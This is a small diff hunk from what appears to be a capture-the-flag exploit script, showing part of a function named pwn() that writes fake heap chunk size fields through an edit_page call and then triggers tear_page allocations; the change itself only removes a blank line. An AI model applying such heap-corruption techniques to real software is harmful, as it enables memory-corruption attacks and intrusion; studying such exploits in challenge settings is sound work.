@@ -122,7 +122,6 @@ def pwn():
 
 	edit_page(p64(0xb00bface)*7 + p64(0x21) + p64(0xb00bface)*3 + p64(0x41))
 
-
 	tear_page(0x400, 'A'*8)
 	tear_page(0x100, 'A'*8)
 
